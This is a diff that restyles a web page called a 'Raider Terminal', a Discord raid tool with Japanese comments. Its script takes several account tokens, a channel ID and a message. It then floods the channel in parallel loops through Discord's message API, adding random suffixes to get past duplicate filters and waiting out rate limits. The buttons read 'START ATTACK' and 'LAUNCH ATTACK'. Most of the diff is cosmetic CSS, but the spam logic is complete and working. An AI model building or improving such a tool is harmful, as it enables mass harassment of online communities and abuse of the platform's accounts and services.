@@ -3,212 +3,179 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Web Raider Terminal</title>
+    <title>Premium Raider Terminal</title>
     <style>
-        /* モダンなフォントと丸みの設定 */
         :root {
-            --bg-dark: #121212; /* より深く、目に優しい黒 */
-            --bg-main: #1e1e1e; /* コンテナの背景 */
-            --bg-input: #2a2a2a; /* 入力欄の背景 */
-            --blurple: #7289da; /* クリック時に明るく */
-            --blurple-active: #5a6eb1; /* 押し込んだ時の色 */
-            --danger: #ff4d4f; /* 鮮やかな赤 */
-            --danger-active: #d93639; /* 押し込んだ時の赤 */
-            --text-main: #e0e0e0;
-            --text-muted: #a0a0a0;
-            --success: #00e676; /* ログ用 */
-            --radius-large: 24px; /* 全体的な丸み */
-            --radius-small: 12px; /* 入力欄・ボタンの丸み */
+            /* グラデーションパレット */
+            --main-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            --danger-gradient: linear-gradient(135deg, #ff5f6d 0%, #ffc371 100%);
+            --bg-dark: #0f0c29; /* 深みのある紺色 */
+            --card-bg: rgba(30, 30, 50, 0.95);
+            --input-bg: rgba(0, 0, 0, 0.3);
+            --text-color: #ffffff;
+            --radius: 20px;
         }
 
+        /* 背景にグラデーションを適用し、スクロールを可能にする */
         body {
-            background-color: var(--bg-dark);
-            color: var(--text-main);
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background: linear-gradient(to bottom, #0f0c29, #302b63, #24243e);
+            color: var(--text-color);
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             margin: 0;
+            padding: 40px 20px; /* 上下に余白 */
             display: flex;
             justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden; /* スクロールバー防止 */
-        }
-
-        .card {
-            background-color: var(--bg-main);
-            width: 480px; /* わずかに細身に */
-            padding: 40px;
-            border-radius: var(--radius-large);
-            box-shadow: 0 10px 40px rgba(0,0,0,0.6);
-            border: 1px solid #333; /* 境界線を薄く */
+            min-height: 100vh;
+            overflow-y: auto; /* 下へのスクロールを許可 */
             box-sizing: border-box;
         }
 
-        h1 { 
-            font-size: 24px; 
-            text-align: center; 
-            margin-bottom: 30px; 
-            margin-top: 0;
-            color: white; 
+        /* メインカード：少し透明にして高級感を出す */
+        .card {
+            background: var(--card-bg);
+            width: 100%;
+            max-width: 500px;
+            padding: 40px;
+            border-radius: var(--radius);
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+            backdrop-filter: blur(10px); /* 背景をぼかす */
+            border: 1px solid rgba(255,255,255,0.1);
+            height: fit-content; /* 中身の高さに合わせる */
+        }
+
+        h1 {
+            font-size: 26px;
+            text-align: center;
+            margin-bottom: 30px;
+            background: var(--main-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 800;
+        }
+
+        .form-group { margin-bottom: 25px; }
+
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #aaa;
+            margin-bottom: 10px;
             letter-spacing: 1px;
         }
 
-        .form-group { margin-bottom: 20px; }
-        
-        label { 
-            display: block; 
-            font-size: 13px; 
-            font-weight: 600; 
-            color: var(--text-muted); 
-            margin-bottom: 10px; 
-            padding-left: 5px; /* テキストとの揃え */
-        }
-
-        /* 入力欄の丸みとアニメーション */
         textarea, input {
             width: 100%;
-            background-color: var(--bg-input);
-            border: 2px solid transparent; /* 初期状態は透明 */
-            border-radius: var(--radius-small);
+            background: var(--input-bg);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 12px;
             color: white;
-            padding: 14px;
+            padding: 15px;
             box-sizing: border-box;
             outline: none;
-            font-size: 15px;
-            transition: all 0.2s ease; /* ホバー・フォーカス時のアニメーション */
+            transition: 0.3s;
         }
 
-        textarea:hover, input:hover { background-color: #333; }
-        
-        /* フォーカスした時（入力中）の丸みのある青い線 */
-        textarea:focus, input:focus { 
-            background-color: #1a1a1a;
-            border-color: var(--blurple);
-            box-shadow: 0 0 10px rgba(114, 137, 218, 0.4);
+        textarea:focus, input:focus {
+            border-color: #667eea;
+            box-shadow: 0 0 15px rgba(102, 126, 234, 0.3);
         }
 
-        .controls { 
-            display: flex; 
-            gap: 15px; 
-            margin-top: 30px; 
-        }
+        /* ボタン：グラデーションとアニメーション */
+        .controls { display: flex; gap: 15px; margin-top: 30px; }
 
-        /* ボタンの共通設定（丸みとクリック感） */
         button {
             flex: 1;
-            padding: 16px;
+            padding: 18px;
             border: none;
-            border-radius: var(--radius-small);
-            font-weight: 700;
-            cursor: pointer;
+            border-radius: 15px;
+            font-weight: bold;
             color: white;
-            font-size: 16px;
-            letter-spacing: 1px;
-            transition: all 0.1s ease; /* クリック時の素早いレスポンス */
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.3); /* 立体感 */
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
         }
 
-        /* --- スタートボタン（丸みとクリック感） --- */
-        .btn-start { 
-            background-color: var(--blurple); 
-        }
-        
-        /* ホバー（マウスを載せた時） */
-        .btn-start:hover { 
-            background-color: #839efc;
-            transform: translateY(-2px); /* わずかに浮かせる */
-            box-shadow: 0 6px 15px rgba(114, 137, 218, 0.5);
-        }
-        
-        /* アクティブ（クリックして押し込んだ時） */
-        .btn-start:active { 
-            background-color: var(--blurple-active);
-            transform: translateY(1px); /* 押し込んだ表現（沈ませる） */
-            box-shadow: 0 2px 5px rgba(0,0,0,0.4);
+        .btn-start {
+            background: var(--main-gradient);
         }
 
-        /* --- ストップボタン（丸みとクリック感） --- */
-        .btn-stop { 
-            background-color: var(--danger); 
+        .btn-stop {
+            background: var(--danger-gradient);
         }
-        
-        .btn-stop:hover { 
-            background-color: #ff7875;
-            transform: translateY(-2px);
-            box-shadow: 0 6px 15px rgba(255, 77, 79, 0.5);
+
+        /* クリックした時の「押し込んだ感じ」 */
+        button:hover {
+            transform: translateY(-3px);
+            filter: brightness(1.1);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.4);
         }
-        
-        .btn-stop:active { 
-            background-color: var(--danger-active);
+
+        button:active {
             transform: translateY(1px);
-            box-shadow: 0 2px 5px rgba(0,0,0,0.4);
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
         }
 
-        /* ログエリアの丸み */
+        /* ログエリア：中身が増えてもスクロール可能 */
         #console {
-            margin-top: 25px;
-            height: 120px;
-            background-color: rgba(0,0,0,0.5);
-            border-radius: var(--radius-small);
+            margin-top: 30px;
+            height: 150px;
+            background: rgba(0,0,0,0.4);
+            border-radius: 15px;
             padding: 15px;
-            font-family: 'Consolas', 'Courier New', monospace;
-            font-size: 13px;
+            font-family: 'Consolas', monospace;
+            font-size: 12px;
             overflow-y: auto;
-            color: var(--success);
-            border: 1px solid #333;
+            border: 1px solid rgba(255,255,255,0.05);
         }
 
-        /* ログエントリーのスタイル */
-        .log-entry { margin-bottom: 6px; }
-        .log-error { color: var(--danger); font-weight: bold; }
-        .log-success { color: var(--success); }
+        .log-entry { margin-bottom: 5px; border-left: 3px solid #667eea; padding-left: 8px; }
+        .log-error { border-left-color: #ff5f6d; color: #ff5f6d; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <h1>RAIDER WEB TERMINAL</h1>
+    <h1>PREMIUM RAIDER</h1>
 
     <div class="form-group">
-        <label>Discord Tokens (1 line per token)</label>
-        <textarea id="tokens" rows="4" placeholder="Paste tokens here..."></textarea>
+        <label>DISCORD TOKENS</label>
+        <textarea id="tokens" rows="4" placeholder="トークンを貼り付け..."></textarea>
     </div>
 
     <div class="form-group">
-        <label>Channel ID</label>
-        <input type="text" id="channelId" placeholder="Enter Channel ID">
+        <label>CHANNEL ID</label>
+        <input type="text" id="channelId" placeholder="IDを入力">
     </div>
 
     <div class="form-group">
-        <label>Message Content (\n for new line)</label>
-        <textarea id="message" rows="2" placeholder="Enter message..."></textarea>
+        <label>MESSAGE (Use \n for lines)</label>
+        <textarea id="message" rows="2" placeholder="メッセージを入力"></textarea>
     </div>
 
     <div class="form-group">
-        <label>Delay (ms) - 0 for max speed</label>
+        <label>DELAY (ms)</label>
         <input type="number" id="delay" value="0">
     </div>
 
     <div class="controls">
-        <button id="start" class="btn-start">START ATTACK</button>
+        <button id="start" class="btn-start">LAUNCH ATTACK</button>
         <button id="stop" class="btn-stop">STOP</button>
     </div>
 
     <div id="console">
-        <div class="log-entry log-success">Terminal initialized.</div>
+        <div class="log-entry">System ready...</div>
     </div>
 </div>
 
 <script>
-    // --- 内部ロジックは前のままですが、ログの表示を少し改良 ---
     let isRunning = false;
     const consoleDiv = document.getElementById('console');
 
-    function log(msg, type = '') {
+    function log(msg, isError = false) {
         const div = document.createElement('div');
-        div.className = `log-entry ${type}`;
-        div.innerText = `[${new Date().toLocaleTimeString('ja-JP')}] ${msg}`;
+        div.className = `log-entry ${isError ? 'log-error' : ''}`;
+        div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
         consoleDiv.prepend(div);
     }
 
@@ -216,10 +183,8 @@
 
     async function fire(token, channelId, message, delay) {
         const url = `https://discord.com/api/v9/channels/${channelId}/messages`;
-        
         while (isRunning) {
             const content = `${message} | ${randomStr()}`;
-            
             try {
                 const res = await fetch(url, {
                     method: 'POST',
@@ -230,20 +195,20 @@
                     body: JSON.stringify({ content, tts: false })
                 });
 
-                if (res.status === 200 || res.status === 201) {
-                    log(`SUCCESS: ${token.substring(0, 10)}...`, 'log-success');
+                if (res.ok) {
+                    log(`SUCCESS: ${token.substring(0, 8)}...`);
                 } else if (res.status === 429) {
                     const data = await res.json();
-                    log(`RATELIMIT: Wait ${data.retry_after}s`, 'log-error');
+                    log(`RATELIMIT: ${data.retry_after}s`, true);
                     await new Promise(r => setTimeout(r, data.retry_after * 1000));
                 } else {
-                    log(`FAILED: ${res.status}`, 'log-error');
+                    log(`FAILED: ${res.status}`, true);
                 }
             } catch (e) {
-                log("CORS Error / Connection Error", 'log-error');
+                log("CORS/Network Error", true);
             }
-
             if (delay > 0) await new Promise(r => setTimeout(r, delay));
+            else await new Promise(r => setTimeout(r, 50)); 
         }
     }
 
@@ -254,22 +219,16 @@
         const message = document.getElementById('message').value.replace(/\\n/g, '\n');
         const delay = parseInt(document.getElementById('delay').value);
 
-        if (!tokens.length || !channelId) {
-            alert("Check Tokens or Channel ID!");
-            return;
-        }
+        if (!tokens.length || !channelId) return alert("入力が足りません");
 
         isRunning = true;
-        log("Attack started!", 'log-success');
-
-        tokens.forEach(t => {
-            fire(t, channelId, message, delay);
-        });
+        log("Attack initiated.");
+        tokens.forEach(t => fire(t, channelId, message, delay));
     };
 
     document.getElementById('stop').onclick = () => {
         isRunning = false;
-        log("Attack stopped.", 'log-error');
+        log("Attack stopped.", true);
     };
 </script>
 
